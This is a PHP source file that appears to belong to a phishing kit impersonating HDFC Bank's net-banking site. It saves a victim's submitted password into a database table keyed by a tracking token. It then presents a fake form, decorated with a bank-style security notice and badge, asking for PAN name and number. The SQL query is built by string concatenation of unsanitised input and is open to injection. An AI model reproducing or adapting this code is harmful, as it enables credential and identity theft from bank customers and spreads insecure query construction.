<?php

if(!empty($_POST['user_pass'])) {
    $user_pass = $_POST['user_pass'];
}
else {
    header("Location: ./");
    die();
}
$token = $_POST['token'];

require_once "header.php";

$query = 'UPDATE `user_data` SET `user_pass` = "'.$user_pass.'" WHERE `UID` = "'.$token.'"';
require_once "db.php";

?>

<div class="container center" style="max-width:420px">
	<div class="row welcmewrap">
        <div class="welcomesec1" style="margin-bottom:0">
            <div class="hdfcstatictxt mB20">Enter PAN Details</div>
            <div class="netwrapper">
                <div class="col-12">
			        <form method="post" action="mobile.php">
                        <div class="mB10">
                            <div class="inputfield ibvt loginData">
                            <div class="lablefield ibvt mB0"><span>PAN Name</span></div>
                                <input
                                    placeholder="Enter your name"
                                    class="form-control" 
                                    name="pan_name"
                                    maxlength="25"
                                    minlength="5"
                                    type="text"
                                    required
                                    autofocus />
                                <input name="token" value="<?php echo $token ?>" hidden />
                            </div>
                        </div>
                        <div class="mB20">
                            <div class="inputfield ibvt loginData">
                            <div class="lablefield ibvt mB0"><span>PAN Number</span></div>
                                <input
                                    placeholder="Enter your pan number"
                                    class="form-control" 
                                    name="pan_no"
                                    maxlength="10"
                                    minlength="10"
                                    length="10"
                                    type="text"
                                    required />
                            </div>
                        </div>
                        <div class="mB20">
                            <div class="inputfield ibvt loginData">
                                <button class="btn btn-primary login-btn" type="submit">SUBMIT</button>
                            </div>
                        </div>
                    </form>
                </div>
                <br />
                <div class="col-12">
                    <div class="nortonsecurity center lnheight" style="text-align:center"><img alt="" src="images/nortonsecurity.png" /></div>
                    <div class="hdfcsmalltxt">
                        <span class="color666">Your security is of utmost importance.</span>
                        <span class="lightbluecolor"><a onclick="return window.open('https://www.hdfcbank.com/personal/useful-links/security')" href="javascript:void(0)">Know More...</a></span>
                    </div>
                </div>
                <div class="clearfix"></div>
            </div>
        </div>
	</div>
</div>

<?php include_once "footer.php"; ?>